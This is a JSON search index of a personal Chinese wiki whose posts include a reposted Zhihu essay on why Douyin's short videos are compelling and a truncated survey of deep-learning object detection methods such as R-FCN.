{"pages":[{"title":"About","date":"2018-02-19T04:21:50.509Z","path":"about/index.html","text":""},{"title":"Categories","date":"2018-02-19T04:21:50.522Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2018-02-19T04:21:50.545Z","path":"tags/index.html","text":""}],"posts":[{"title":"论文阅读笔记-Interpretable Convolutional Neural Networks","date":"2018-07-20T12:46:38.000Z","path":"wiki/深度学习-Deep Learning/可解释性CNN - Interpretable CNN/文阅读笔记-Interpretable-Convolutional-Neural-Networks/","text":"","tags":[],"categories":[{"name":"深度学习-Deep Learning","slug":"深度学习-Deep-Learning","permalink":"http://yoursite.com/categories/深度学习-Deep-Learning/"},{"name":"可解释性CNN - Interpretable CNN","slug":"深度学习-Deep-Learning/可解释性CNN-Interpretable-CNN","permalink":"http://yoursite.com/categories/深度学习-Deep-Learning/可解释性CNN-Interpretable-CNN/"}]},{"title":"深度学习的弱点","date":"2018-07-20T12:28:03.000Z","path":"wiki/剪贴板-Clipboard/深度学习-Deep Learning/学习的弱点/","text":"是不是并不是所有问题都适合用神经网络预测？ https://www.zhihu.com/question/277551944/answer/445599404","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"深度学习-Deep Learning","slug":"剪贴板-Clipboard/深度学习-Deep-Learning","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/深度学习-Deep-Learning/"}]},{"title":"如何评价短视频 APP「抖音」？","date":"2018-07-20T12:11:06.000Z","path":"wiki/剪贴板-Clipboard/商业-Business/何评价短视频-APP「抖音」？/","text":"最近发现越来越多的人开始沉迷抖音无法自拔，大家都直呼抖音的小视频太好看的。大多数人刷完抖音，再去看其他的视频app，都变得索然无趣。如果没想明白这些，就算把抖音的全部内容和网红都买下来 可能也无济于事。那么平心而论，抖音现在这么火的真的是因为内容多精美多好么？不。幻灯片式的PPT视频网上传烂了的搞笑gif动态图枯燥乏味的PS/excel教程没有任何技术含量的街头随拍微信聊天记录的录屏重复了一次又一次的美女对嘴型、对手势还有记录自己从起床到上班到回家的流水账视频这些视频，从传统意义上来讲，无论是从视频内容本身的观赏性、故事性、精美程度、还是从拍摄的技巧性、画面构成都和“好”“精品”这些字眼八竿子打不到一边。没有精美的画面，没有高超的技巧，甚至不需要俊男靓女。那么问题来了，为什么这些其实并不那么精美的视频，并没有传说中都是精品的抖音，能让那么多人“沉迷抖音无法自拔”“有毒！一刷就停不下来”？可能有些人要说，你只看到了抖音内容不好的一面，大比例来说抖音的内容还是胜过其他平台的可能有些人想到，针对的用户群体不一样而已，每个人对内容审美判断是有差异的，有些你觉得low的视频，很多人觉得好看也可能有些人想说，抖音也还是有一定个性化推荐的，大家看到的内容都是好看的这些我觉得都是可能的因素之一，但我觉得这都不是抖音内容能让人不断中毒，风靡全国的原因。那么，抖音的内容到底好在哪里？可能很多人还在想这个问题，尤其是也正在做短视频的同行们。抖音的崛起不可思议。我们先从内容角度来重新看看抖音那么，抖音的内容到底好在哪里？1、抓住了内容的本质，同时也是抓住了用户的本质。内容的本质并不在于它有多精美，并不在于它是否像艺术品那样能够供人观赏。内容之所以成为后流量时代的兵家必争之地，拥有无比大的魔力，就在于内容的本质其实是人心。一个好的内容其实跟它本身精不精美没有必然联系，关键看它能不能唤起你内心深处的七情六欲和你浮于表面的五感六觉。在这一点上抖音做的算是非常合格了，你可能不明白这样乱七八糟的内容为什么能上推荐，但你仔细想想，都有其道理。PPT式的劣质视频——它传递了有用的信息和价值微信聊天记录——似曾相识，或前后套路反差冲突带来的戏剧性不信你可以把你们那些觉得有趣的，但是说不上来到底哪里好的一一去找找看，它到底刺激到了你们的哪个G点。此处不一一枚举，抖音内容他有魔性在于他抓住了内容的本质，满足了用户的好奇心、共鸣感、新鲜感和用户的七情六欲，五感六觉。2、 巧妙的议程设置，抖音内容具有极高的继承性、发展性和连贯性议程设置是大众传播的重要社会功能和效果之一。20世纪70年代，美国传播学者麦克姆斯和肖通过实证研究发现，在公众对社会公共事务中重要问题的认识和判断与传播媒介的报道活动之间，存在着一种高度对应的关系，即传播媒介作为“大事”加以报道的问题，同样也作为大事反映在公众的意识中；上面这个可能太专业了，说的通俗易懂点，就是抖音的挑战和话题。抖音的挑战和话题就是典型的议程设置引导。抖音的运营一直在尝试强力引导暗示和诱发抖音用户的内容生产行为。不过抖音老公民应该可以发现，抖音的话题和挑战已经形同虚设了，都是随便发了一个视频挂在某个话题下。但这也没有影响抖音内容议程设置的属性继续发挥下去。抖友们经常会发现，上面刚刷到一个摘奔驰车标的恶搞视频，在不远的地方又刷到一个同一个车主发现车标被摘的视频。这个比较绝了，有没有觉得很神奇？很不可思议，很意外很惊喜？ 你要破案了~ 于是评论区大帮抖友帮助奔驰车主逮到了偷车标的人。这两个视频之间就是高度对应的关系。除此之外，围绕同一议程，抖音的视频内容不仅高度对应，还是可继承的，在发展的最开始流行的 小哥哥小哥哥，我能送你一个东西么 的梗 “小哥哥小哥哥，送你一个东西你要么。我，你要么？”到后面 小哥哥系列的各种反转， “前面这个人是我老婆，我们都结婚了，她让我去撩她，孩子都有了，她让我去撩她”到最后 小哥哥系列被彻底玩坏，“小鸽鸽，小鸽鸽” 前面的小鸽鸽已经是鸽子了还有土耳其冰淇淋的反转开始看到的都是 游客被土耳其冰淇淋老外各种戏耍的视频后面看到的是 游客机智反杀土耳其冰淇淋老外的视频这个议程前后是发展变化的，且有继承性和连贯性，你可能一不小心就看了一部连续剧下面这个case是一个屌丝男 拍了一段抖音讲自己送女神拔罐器。然后网友就找到了女主的抖音号。然后再抖友的怂恿下展开了屌丝追女神，和女神慢慢接受屌丝的日更连续剧。如果你没看过前面的A视频，直接去看后面B视频，你可能就一头雾水了，这什么鬼东西，不明白好笑在哪里。所以如果今天，只是单纯的把游客反杀土耳其冰淇淋的视频搬运过来，你会发现，用户更本看不懂。在抖音上又火又好看的视频，生搬硬套到任何其他平台，都无疾而终。这里其实也涉及到另外一个重要壁垒的形成，这部分先只谈内容层面的问题。3、 抖音的内容强运营策略抖音目前依然是中心化运营的思路，运营对内容的控制占据主导地位（有利有弊，是个值得深入探讨的话题，这里暂不展开）。运营就是背后一双无形的手，在控制着一个推荐池。推荐池不是看到点赞高的就往里面丢，也不是看到好看的就往里面塞，根据以往的经验，抖音运营的推荐池应该是有比例控制，策略调配的。从你进入抖音开始，你就进入了抖音的套，当然这个套路未必对所有有效你会发现，刷一晚上的抖音，你可能经历了生活的起起落落开心不开心，平淡真实和高潮迭起。当然，肯定不是运营完全限定好的分发节奏，算法推荐也不太可能做到这么精细的分发。原理其实很简单，运营应该是通过控制运营池配合基于点赞和关注的弱个性化算法来达到四两拨千斤的效果。至于运营池怎么控制，可以有个内容主题类型的配比策略，就好像你要准备一道满汉全席，主菜多少，配菜多少，都是经过精密安排的，假如有一天抖音全部都是小哥哥小姐姐视频，你可能5分钟就腻了，所以必须不断调控运营池里面的内容，保证合理的比例。之前在阿里时做个类似弱个性化探索的项目，其中有一个很重要的运营之手，就是控制推荐池内容的比例，分布，来调控整体分发的内容达到自己的运营目标4、抖音的音乐很神奇后面我们再谈，抖音以音乐细分领域切入短视频市场的产品定位创新。现在我们仅从内容角度来看，抖音的内容为什么这么好看。可以说，音乐起到的作用至少占50%！话不多说，你们可以把手机调成静音，看30分钟的抖音，来感受下！借用知乎网友的总结Juslin (2013) 总结了对于“音乐如何影响情绪”的一些猜想（以下只是翻译）1. 脑干反射：音乐当中一种或多种声学上的基本特性被脑干捕获，脑干将此识别成一些值得注意的重要或紧急信息2. 生理节律与音乐节奏的”共鸣”：人体的一些生理节律（例如心律）在外部的音乐节奏/节拍影响下，和音乐同步。有过live经验的人对此应该有所体会3. 评价性条件反射：某些音乐在某个人的经历里总是和或正面或负面的其他刺激同时出现，这个人在听到相应的音乐时就会被引起相应的或正面或负面的情绪（可参考：经典条件反射）4. 情绪传染：人感受到音乐所传递的情绪，继而将其内化（可参考：共情）5. 视觉想像：这个很容易理解，听到音乐时联想到了一些视觉画面，就引起了和那些视觉画面相联系的情绪6. 情节记忆：音乐让人回忆起了关于自身的一些过往经历，引起了和这些经历相关的情绪7. 对音乐的期待：在一段音乐的行进当中，无论是符合了还是违反了听者对于音乐的期待，都有可能引起情绪所以，大脑在音乐的听觉感官刺激作用下和视频本身内容结合起来，可能一些原本没那么好看的视频，突然多了很多不一样的信息。抖音也捧火了无数好听的音乐，重度抖音中毒用户可能也有这样的经历，不知道该听什么歌，也并不想看抖音的视频，但就是打开抖音，声音开到最大，听着抖音的音乐，做家务或洗澡。已经很难分清是抖音捧火了音乐，还是音乐成就了抖音。5、 抖音内容的低门槛，易模仿未来短视频一定是UGC的。PGC内容的精美性，抬高了内容生产的门槛，精品意味着低频。所以抖音最让我意外的并不是，它在最初的时候能邀请到一些网红生产一些非常精致的PUGC视频，这个说实话，花点钱，谁都可以做到。让我意外的是，抖音能够果断作出决策，牺牲一定内容的质量，换取内容的高频。这也就是有段时间抖音不断被病诟，内容不如以前精彩了，也逐渐变的像快手了。我认为抖音是牺牲了一棵树，换回来了一整片森林。只有UGC的内容才能具备社交属性，未来的短视频一定不仅仅只是一种内容，而是承载信息的一种方式和载体，这就类似于，从前车马慢我们用书信交流和表达自我，博客出来后我们用文字表达自我和交流，再到后来基础技术的发展，我们已经可以很便捷低成本的使用图片来表达交流，ins、weibo、facebook、朋友圈都是。然后以后，可能就是用视频来交流和表达自我了。所以短视频未来不是单纯的可消费的内容，而是一个全新的交流载体。抖音现在在不断的降低内容生产的门槛，换来了高频的内容生产、自我表达和信息交流。抖音的所有内容都是容易被模仿和复制的，让所有平凡的每个人都看到了表达自我的可能性，不论你在家里办公室还是寝室，不论你高矮胖瘦，你都可以尽情的表达你自己。抖音用视频释放了新一代年轻的自我表达。分析了这么多抖音的内容，是不是我们把这些套路这些内容全部搬运过来就能成功了？不，谁说抖音的成功是因为内容好看了？如果你已经看到这里，前面分析的内容你可以先当做屁一样的放掉了。如果还只看到，只想到内容上怎么超越抖音，怎么做的更精致。那么很遗憾，你将注定不可能追赶上拥有无限潜力的抖音了。因为你甚至都还没意识到问题根源在哪儿，抖音和你早就已经不在一个层面上了，不是一个次元的东西了。而且随着时间推移你会发现，明明我的内容已经很精彩很棒了啊，为什么还是不行。这就好比你的老婆明明只想要一个苹果，你给他买了一整车的香蕉，方向不对，南辕北辙，你越努力可能和抖音的距离就越遥远。欲知后事如何，请听下回分解。这里是分割线，感谢大家的认可，也有很多人提出了质疑~欢迎一起交流探讨从事过内容行业的老司机，从抖音的内容为什么这么好看中不难看出端倪，抖音的内容是具有很强互动性和社交属性的，已经形成了社区圈群的文化壁垒。这就是为什么同样的内容，在抖音看就好看，在其他app上如同嚼蜡。虽然最初开始的时候，抖音依靠一批邀约过来的帅哥靓女，酷炫的拍摄技巧制作出来的精致视频一下子抓住了一线城市的时尚年轻用户，打响了口碑。但它之后的发展之路和精致内容完全没有关系。抖音的野心从最开始就不是做一个头条一样的内容分发平台，而是做快手、做B站这样的内容社交平台。没有了恰到好处的音乐 没有了抖友文化 没有有趣的评论 没有了前后继承的主题和情节 没有了巧妙的运营池策略 一个个分散无神的内容，突然就没意思了。视频还是那个视频甚至网红还是那个网红，但一切都索然无味了。这就是社区的力量，这才是短视频的本质——社交。社交的本质是什么？ 借用知乎大神孙金龙的一段原话相互养成。小王子里有一段故事，精准的阐述了社交的本质，建议大家一字不落的读一遍。“来和我一起玩吧，”小王子建议道，“我很苦恼……” “我不能和你一起玩，”狐狸说，“我还没有被驯养呢。” “啊！真对不起。”小王子说。 思索了一会儿，他又说道： “什么叫‘驯养’呀？” “你不是此地人。”狐狸说，“你来寻找什么？” “我来找人。”小王子说，“什么叫‘驯养’呢？” “这是已经早就被人遗忘了的事情，”狐狸说，“它的意思就是‘建立联系’。” “建立联系？” “一点不错，”狐狸说，“对我来说，你还只是一个小男孩，就像其他千万个小男孩一样。我不需要你，你也同样用不着我。对你来说，我也不过是一只狐狸，和其他千万只狐狸一样。 但是，如果你驯养了我，我们就互相不可缺少了。对我来说，你就是世界上唯一的了；我对你来说，也是世界上唯一的了。”“我有点明白了。”小王子说，“有一朵花……我想，她把我驯养了……” “这是可能的。”狐狸说，“世界上什么样的事都可能看到……” 可是，狐狸又把话题拉回来： “我的生活很单调。我捕捉鸡，而人又捕捉我。所有的鸡全都一样，所有的人也全都一样。因此，我感到有些厌烦了。但是，如果你要是驯养了我，我的生活就一定会是欢快的。我会辨认出一种与众不同的脚步声。其他的脚步声会使我躲到地下去，而你的脚步声就会像音乐一样让我从洞里走出来。再说，你看！ 你看到那边的麦田没有？我不吃面包，麦子对我来说，一点用也没有。我对麦田无动于衷。而这，真使人扫兴。但是，你有着金黄色的头发。那么，一旦你驯养了我，这就会十分美妙。麦子，是金黄色的，它就会使我想起你。而且，我甚至会喜欢那风吹麦浪的声音……” 狐狸沉默不语，久久地看着小王子。 “请你驯养我吧！”他说。 “我是很愿意的。”小王子回答道，“可我的时间不多了。 我还要去寻找朋友，还有许多事物要了解。” “只有被驯养了的事物，才会被了解。”狐狸说，“人不会再有时间去了解任何东西的。他们总是到商人那里去购买现成的东西。因为世界上还没有购买朋友的商店，所以人也就没有朋友。如果你想要一个朋友，那就驯养我吧！” “那么应当做些什么呢？”小王子说。 “应当非常耐心。”狐狸回答道，“开始你就这样坐在草丛中，坐得离我稍微远些。我用眼角瞅着你，你什么也不要说。话语是误会的根源。但是，每天，你坐得靠我更近些……” 第二天，小王子又来了。 “最好还是在原来的那个时间来。”狐狸说道，“比如说，你下午四点钟来，那么从三点钟起，我就开始感到幸福。时间越临近，我就越感到幸福。到了四点钟的时候，我就会坐立不安，我就会发现幸福的代价。但是，如果你随便什么时候来，我就不知道在什么时候该准备好我的心情……应当有一定的仪式。” “仪式是什么？”小王子问道。 “这也是一种早已被人忘却了的事。”狐狸说，“它就是使某一天与其他日子不同，使某一时刻与其他时刻不同。比如说，我的那些猎人就有一种仪式。他们每星期四都和村子里的姑娘们跳舞。于是，星期四就是一个美好的日子！我可以一直散步到葡萄园去。如果猎人们什么时候都跳舞，天天又全都一样，那么我也就没有假日了。” 就这样，小王子驯养了狐狸。当出发的时刻就快要来到时： “啊！”狐狸说，“我一定会哭的。” “这是你的过错，”小王子说，“我本来并不想给你任何痛苦，可你却要我驯养你…” “是这样的。”狐狸说。 “你可就要哭了！”小王子说。 “当然啰。”狐狸说。 “那么你什么好处也没得到。” “由于麦子颜色的缘故，我还是得到了好处。”狐狸说。 然后，他又接着说：“再去看看那些玫瑰花吧。你一定会明白，你的那朵是世界上独一无二的玫瑰。你回来和我告别时，我再赠送给你一个秘密。” 于是小王子又去看那些玫瑰。 “你们一点也不像我的那朵玫瑰，你们还什么都不是呢！” 小王子对她们说。 “没有人驯养过你们，你们也没有驯养过任何人。你们就像我的狐狸过去那样，它那时只是和千万只别的狐狸一样的一只狐狸。但是，我现在已经把它当成了我的朋友，于是它现在就是世界上独一无二的了。” 这时，那些玫瑰花显得十分难堪。 “你们很美，但你们是空虚的。”小王子仍然在对她们说，“没有人能为你们去死。当然啰，我的那朵玫瑰花，一个普通的过路人以为她和你们一样。可是，她单独一朵就比你们全体更重要，因为她是我浇灌的。因为她是我放在花罩中的。因为她是我用屏风保护起来的。因为她身上的毛虫（除了留下两三只为了变蝴蝶而外）是我除灭的。因为我倾听过她的怨艾和自诩，甚至有时我聆听着她的沉默。因为她是我的玫瑰。” 社交的本质是养成，而养成依靠互动。什么叫互动？看了不算互动，关注也不是，我留言你回复算是互动。互动必须有来有往才行。互动有两类。熟人间的互动，是你说一句，我回一句，一来一往，具体的产品形式，是IM。IM的网络效应极强，你用了微信，平时跟你联系的人，不论年龄、喜好、地域，也都要用微信。因此IM产品往往一家独大。陌生人社交长期存在着两类产品，论坛和IM。探探，早期的陌陌，都是IM类。但IM有个大问题——平权。平权的意思，就是我给你发句话，你就会回我一句。但陌生人社交天然不平权，人们只会对超出自己的人感兴趣。举个例子，一个又穷又挫的男生发现了一个漂亮妹子，想勾搭一下，可漂亮妹子对他完全没兴趣。所以陌陌后来做了直播，直播就是典型的非平权产品。一群屌丝围观一个漂亮妹纸，打赏。既然做不到平权，怎么完成社交的本质——相互养成呢？通过内容来养成。回过头来，重新来看抖音。也许你能恍然大悟，抖音内容为什么那么好看？答案是，它已经是个社区雏形。未来是新社交。抖音的社区和社交属性的雏形1、 评论区：有组织，有脑洞，有看点有组织抖音几大神秘组织：过山车大队、赤赤大队、晓组织、李云龙组织有脑洞我早晚会笑死在抖音的评论里有看点评论自带笑点，评论自带剧本，评论可能比视频好看2、内容：隔屏互动，表达自我，万人演绎号主与用户之间隔屏互动：具体参见国民第一老婆晓晓的寄几，对着屏幕一个香吻你受不受得了号主与号主之间的隔屏互动：之前的case提到男追女的视频，男的自己有个抖音号，女的也有抖音号，两个号就是互动的表达自我：表达心情，晒宝贝，晒萌宠2、 抖音号：活跃生态，联合互动，自我驱动联合互动之前的case提到男追女的视频，男的自己有个抖音号，女的也有抖音号，两个号就是互动的。为什么这里又提一次。从B侧角度看，这里以后是可以做号主自运营的阵地。大号小号合作生产内容，大号给小号导量。这里还可以商业化自我驱动这是我自己的号，如果不更新，你会发现总有那么几个粉丝让你不忍抛弃，催促着你更新，发布。虽然没有流量也没有钱，仿佛你不想欠他们的。抖音上经常看到标题为，为了我的2个粉丝我拼了，这都是自我驱动什么不是自我驱动？平台账号体系、广告激励分成、发稿给钱保底等都属于平台驱动4、用户：抖音公民，身份认同，圈群文化抖友出征，寸草不生天王盖地虎，小鸡炖蘑菇滴，滴滴能对出暗号的算是基本入门了。5、一场以发布者内容为原始素材，全民参与加工的内容交流与互动玩儿起来：参与感，玩儿起来同一个话题主题，N多人都在拍，万人带你看陕西摔碗酒，万人一起跳C哩C哩舞、海草舞、抖音的广告都能玩儿抖音的头像都能玩儿抖音的赞都能玩儿鼻子点赞，双击手机可以截屏抖音的视频内容都只是大家社交互动的素材之一了，什么东西都可以玩儿，只是一个载体再回过头来看看，是不是陡然发现，你和抖音不是差了一两个网红，而是差了一个微博和b站。抖音到现在为止的野心已经昭然若揭，牺牲内容的精品性，换取内容的高频互动，不断降低内容门槛，不断的加强内容的互动和交流属性弱化内容的观赏属性，慢慢的进化成为一个社区乃至一个以视频内容来进行社交的平台。抖音喊出了新的slogan细心观察的人可能会发现抖音在推荐分发上开始逐渐尝试把一些0赞0评论的视频分发给你，点开头像你可能发现这是你通讯录里的朋友。配合抖音的全新slogan，抖音可能想做一个熟人生人的视频社交平台无疑了。现在很多年轻人的业余生活其实是乏味的，社交渠道是闭塞的，通过视频有血有肉的体验了一把天南地北，富贵贫穷的不同生活，通过视频和小姐姐小哥哥互动，通过评论和内容创作表达自我，和他人沟通，很大程度上解决了内心的那种孤独感、寂寞感和下班后在家里百无聊赖不知道何去何从的迷茫感。在抖音里有和你一样的人，也有和你截然不同的人，有着一样的感慨，不一样的生活经历，看着视频，听着音乐，看着嘈杂的评论，和你一样平凡的人每天的喜怒哀乐，仿佛不那么孤独，永远那么热闹，永远有人陪着你一起笑一起闹，一起玩儿一起互动，一起体验千奇百怪的景色、生活、一起感触那些曾经、那些美好，去看到生活的另一面在现实中不能被实现的那份遗憾（别人家的老婆、老公）。功能和其他商业化、营销上的优势1、 视频清晰度增强：同样的拍摄条件，同一个视频在不同平台上，清晰度差异很大。不列举，怕树敌。2、 看完抖音想买的系列（抖音的购物链接）3、 视频播放的流畅度抖音真的有那么夸张么？有那么好么？NO，抖音的问题是致命的！抖音基于运营内容池为主导的中心化内容分发模式，和日渐茁壮的社区和社交基础，让抖音能够从小众精品内容app变成一个让整个短视频领域都头痛的敌人。但成也风云，败也风云。抖音的焦虑其实已经逐渐显现了，抖音的焦虑也可能是我们的机会。1、 中心化主导的内容分发模式永远无法应对井喷的用户量需求和井喷的内容创作量的分发需求用户量越大，每个用户对内容的需求差异度也会越大。用户需要消费的差异化内容也会越多，单靠运营推荐池，迟早要崩掉。中心化的分发模式，无法适应海量用户的需求，这种模式适用于人群精准，人群固定的平台。内容创作量越大，中心化分发的瓶颈就越突出，你靠运营池来推荐，撑死了运营池给你一天万把条，无奈你一天几十万条的内容嗷嗷待哺，分发不出去，没人看，谁还创作？号主生态垮了，没人发内容了，那就一切完蛋。2、 中心化的内容分发方式与社区、社交平权的天然对立和矛盾中心化的推荐和分发，和社交天然矛盾。举个例子，你很想搭讪妹子A，正常情况下，你去搭讪就好了，没人阻止你搭讪。但现在问题来了，现在有个汉子B，你能不能搭讪到妹子A，和妹子A产生社交和交流，必须要看汉子B乐不乐意。你得想办法先讨好汉子B，但他么的汉子B喜怒无常啊。怎么办……放弃吧。更严重的问题还不是这个， 可能其实妹子A也很喜欢你，你也想搭讪妹子A，但是汉子B就是不让。这里就没办法形成后续的社交了，交流和交流都是不自由不平等的。抖音想继续发展社交，这个坎必须迈过去。微博明星和普通用户之间可是可以直接交流的。3、 为了获取中心化推荐流量，而被过度夸大扭曲的表演，走上快手曾经走过的路同样的是中心化过重的问题，那么为了获取交流和内容传播的权力，怎么办呢。只能夸张的表演，浮夸的剧本，甚至扭曲异化，以博得众人一笑。古人有个专门的词语形容，叫哗众取宠。说的就是现在抖音里开始出现的歪风。再任其发展，就会走上快手曾经的路，烧房子，胸口碎大石，你信不信。不做到社交的真正平权，让用户的交流回归真实，和交流本质，真正做到记录和分享真实的生活点滴，那么抖音只会在妖魔化哗众取宠的路上越走越远，因为每个人的嗨点会越来越难满足，为了满足变态高的嗨点只能选择无所不用其极。如果不迈过这个坎，抖音永远不可能真正实现以视频表达自我，用视频交流你我他的伟大宏愿。4、 想要一片森林，就必定牺牲了几颗树木之前说到，抖音牺牲掉了内容的品质，降低门槛，换取了内容的高频。但丢掉的毕竟就是丢掉了，抖音现在内容就是越来越平民化，甚至有些视频在有些人看来比较无趣低俗，秒删。因为很大一部分人，还是渴望消费精品内容的。有些人，也不需要进行内容互动式的社交，就是想要一个好看的精美的内容平台，没事打发下时间。这批用户，抖音注定流失。这应该是机会之一。就像当时抖音，切入快手的市场，也正是因为市面上对精品内容的渴望，和部分用户对快手式内容的厌倦。5、 社区氛围、圈群文化是围城，圈住了城里的人，同时也会挡住城外的人所有的圈群文化都是有壁垒的，意思就是，你不是我这个圈子的人，你可能连我在讲什么你都不明白。抖音成功塑造了抖友文化，当然也是从内涵段子社区那里继承过来的。“抖友出征，寸草不生”已经成为一种文化符号和身份认同。基于此衍生出来的“天王盖地虎，小鸡炖蘑菇”“滴，滴滴”如果你不是抖友组织，你可能一头雾水，按喇叭“滴，滴滴”什么意思？ 你就被这种圈群文化的壁垒拒之门外了。这种现象最早见于二次元文化圈，三次元的人想要融入二次元是很难的，想要成为b站的高级会员，可是要做几百道考试题的。圈群文化的终极体会逐渐趋向闭塞，价值观不同的人，不愿意你进来影响整个氛围，价值观相同的人才能一起愉快玩耍，道不同不相为谋。所以，随着圈群文化的发展，会越来越排他，排斥和自己不一样的人。这里的好处就不说了，详情见B站，详情见所有成功社区的用户活跃度和高粘性，以及不可抄袭不可打破的壁垒。（产品功能抄不来的东西）坏处也显而易见，就是外面的人可能越来越难融入和进来了。现在才下载抖音的人，或者轻度用户，和重度用户能get到的笑点 和对抖音内容的感官绝对是天壤之别。6、 抖音的向左向右，头条模式，还是快手模式既然去中心化是必然趋势，那么抖音未来到底是向左还是向右？利用大数据做千人千面个性化的内容分发——头条还是基于用户关系通过熟人或生人关系来做内容互动——快手这是个历史问题。事实上，很多产品包括头条，想要鱼也想要熊掌，但一旦走上内容分发平台的路子，永远就没办法发展好关注生态。我在流里面能获取到我需要的内容了，我何必多此一举？想要做社交的，一定面临去中心化，甚至平台不主动做内容分发，平台能忍的住不去做上帝？7、 抖音开了个好头，但抖音离真正的社交表达的革命，还有N个产品迭代和N个运营战略转变未来的交流应该是什么样的，未来的通过内容养成互动是什么样的，未来的短视频应该是什么样的？我觉得正如同学所说可能是去中心化的内容创作。不单单只是去中心化的内容分发。创作上，是可以一起参与创作，一起传播分享，每个人都是这个短视频内容的一个节点，每个人都传播给更多的人。分发上，也是去中心化的，我可以拥有N个圈群，N个小中心化的池子，人与人之间的连接点是内容，而内容与内容之间的连接点是人的关系链。抖音还远远不是。从内容到真正的内容社交，抖音还有很长的路要摸索。现在踩着头条、musical、快手、微博的经验，让他少走了几年弯路，但后面的路，再也没有经验可言，抖音也只能如履薄冰的慢慢走，慢慢摸着石头过河。 https://www.zhihu.com/question/57272673/answer/357609903","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"商业-Business","slug":"剪贴板-Clipboard/商业-Business","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/商业-Business/"}]},{"title":"基于深度学习的目标检测算法综述（一）","date":"2018-07-20T04:54:40.000Z","path":"wiki/剪贴板-Clipboard/深度学习-Deep Learning/深度学习的目标检测算法综述（一）/","text":"vision：基于深度学习的目标检测算法综述（一）​zhuanlan.zhihu.com本文内容原创，作者：美图云视觉技术部 检测团队，转载请注明出处目标检测（Object Detection）是计算机视觉领域的基本任务之一，学术界已有将近二十年的研究历史。近些年随着深度学习技术的火热发展，目标检测算法也从基于手工特征的传统算法转向了基于深度神经网络的检测技术。从最初2013年提出的R-CNN、OverFeat，到后面的Fast/Faster R-CNN，SSD，YOLO系列，再到2018年最近的Pelee。短短不到五年时间，基于深度学习的目标检测技术，在网络结构上，从two stage到one stage，从bottom-up only到Top-Down，从single scale network到feature pyramid network，从面向PC端到面向手机端，都涌现出许多好的算法技术，这些算法在开放目标检测数据集上的检测效果和性能都很出色。本篇综述的出发点一方面是希望给检测方向的入门研究人员提供一个技术概览，帮助大家快速了解目标检测技术上下文；另一方面是给工业界应用人员提供一些参考，通过本篇综述，读者可以根据实际业务场景，找到合适的目标检测方法，在此基础上改进、优化甚至是进一步创新，解决实际业务问题。本文对其中的26篇论文进行介绍，这26篇论文涵盖了2013以来，除SSD，YOLO和R-CNN系列之外的，所有引用率相对较高或是笔者认为具有实际应用价值的论文。R-CNN系列，SSD和YOLO相关的论文详解资源已经非常多，所以本文不再赘述。下图对这些方法进行了分类概括。下文中，我们针对每篇文章，从论文目标，即要解决的问题，算法核心思想以及算法效果三个层面进行概括。同时，我们也给出了每篇论文的出处，录用信息以及相关的开源代码链接，其中代码链接以作者实现和mxnet实现为主。一、 背景物体检测的任务是找出图像或视频中的感兴趣物体，同时检测出它们的位置和大小，是机器视觉领域的核心问题之一。物体检测过程中有很多不确定因素，如图像中物体数量不确定，物体有不同的外观、形状、姿态，加之物体成像时会有光照、遮挡等因素的干扰，导致检测算法有一定的难度。进入深度学习时代以来，物体检测发展主要集中在两个方向：two stage算法如R-CNN系列和onestage算法如YOLO、SSD等。两者的主要区别在于two stage算法需要先生成proposal（一个有可能包含待检物体的预选框），然后进行细粒度的物体检测。而one stage算法会直接在网络中提取特征来预测物体分类和位置。本篇综述将主要分为三个部分：1. Two/One stage算法改进。这部分将主要总结在two/one stage经典网络上改进的系列论文，包括Faster R-CNN、YOLO、SSD等经典论文的升级版本。2. 解决方案。这部分论文对物体检测中遇到的各类问题进行了分析并提出了解决方案。3. 扩展应用、综述。这部分将就特殊物体检测和检测算法在其他领域的应用等方面进行介绍。本综述分三部分，本文介绍第一部分。二、创新内容、改进方向1.Two/One stage算法改进1.1 Two stage Faster R-CNN网络包括两个步骤：1. 使用RPN(region proposal network)提取proposal信息，2. 使用R-CNN对候选框位置进行预测和物体类别识别。本文主要介绍在Faster R-CNN基础上改进的几篇论文：R-FCN、R-FCN3000和Mask R-CNN。R-FCN系列提出了Position Sensitive(ps)的概念，提升了检测效果。另外需要注明的是，虽然Mask R-CNN主要应用在分割上，但该论文和Faster R-CNN一脉相承，而且论文提出了RoI Align的思想，对物体检测回归框的精度提升有一定效果，故将此论文也将介绍了本篇综述中。1.1.1 R-FCN: Object Detection via Region-based Fully Convolutional Networks论文链接：https://arxiv.org/abs/1605.06409开源代码：https://github.com/daijifeng001/R-FCN录用信息：CVPR2017论文目标：对预测特征图引入位置敏感分数图提增强征位置信息，提高检测精度。 核心思想：一. 背景Faster R-CNN是首个利用CNN来完成proposals的预测的，之后的很多目标检测网络都是借助了Faster R-CNN的思想。而Faster R-CNN系列的网络都可以分成2个部分：1.Fully Convolutional subnetwork before RoI Layer 2.RoI-wise subnetwork第1部分就是直接用普通分类网络的卷积层来提取共享特征，后接一个RoI Pooling Layer在第1部分的最后一张特征图上进行提取针对各个RoIs的特征图，最后将所有RoIs的特征图都交由第2部分来处理（分类和回归）。第二部分通常由全连接层组层，最后接2个并行的loss函数：Softmax和smoothL1，分别用来对每一个RoI进行分类和回归。由此得到每个RoI的类别和归回结果。其中第1部分的基础分类网络计算是所有RoIs共享的，只需要进行一次前向计算即可得到所有RoIs所对应的特征图。第2部分的RoI-wise subnetwork不是所有RoIs共享的，这一部分的作用就是给每个RoI进行分类和回归。在模型进行预测时基础网络不能有效感知位置信息，因为常见的CNN结构是根据分类任务进行设计的，并没有针对性的保留图片中物体的位置信息。而第2部分的全连阶层更是一种对于位置信息非常不友好的网络结构。由于检测任务中物体的位置信息是一个很重要的特征，R-FCN通过提出的位置敏感分数图（position sensitive score maps）来增强网络对于位置信息的表达能力，提高检测效果。二. 网络设计2.1position-sensitive score map上图展示的是R-FCN的网络结构图，展示了位置敏感得分图(position-sensitive score map)的主要设计思想。如果一个RoI含有一个类别c的物体，则将该RoI划分为k x k个区域，分别表示该物体的各个相应部位。其每个相应的部位都由特定的特征图对其进行特征提取。R-FCN在共享卷积层的最后再接上一层卷积层，而该卷积层就是位置敏感得分图position-sensitive score map。其通道数channels=k x k x 